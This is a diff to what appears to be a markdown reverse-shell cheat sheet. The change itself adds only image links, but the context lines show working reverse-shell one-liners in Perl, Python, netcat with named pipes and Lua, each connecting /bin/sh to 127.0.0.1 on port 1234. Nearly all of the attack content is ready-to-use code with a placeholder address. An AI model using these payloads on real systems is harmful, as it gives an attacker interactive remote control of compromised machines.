@@ -88,6 +88,9 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[127.0.0.1]:
 
 ```
 
+![agent](../images/WechatIMG54.jpeg)
+
+
 ```python
 
 
@@ -96,6 +99,8 @@ export RHOST="127.0.0.1";export RPORT=1234;python -c 'import sys,socket,os,pty;s
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 ```
+![agent](../images/WechatIMG54.jpeg)
+
 
 ```php
 
@@ -140,6 +145,9 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc  127.0.0.1 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  127.0.0.1 1234 >/tmp/f
 
 ```
+![agent](../images/WechatIMG62.jpeg)
+![agent](../images/WechatIMG63.jpeg)
+
 
 
 ```lua
@@ -147,6 +155,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  127.0.0.1 1234 >/tmp/f
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 
 ```
+
+![agent](../images/WechatIMG54.jpeg)
 
 
 Java
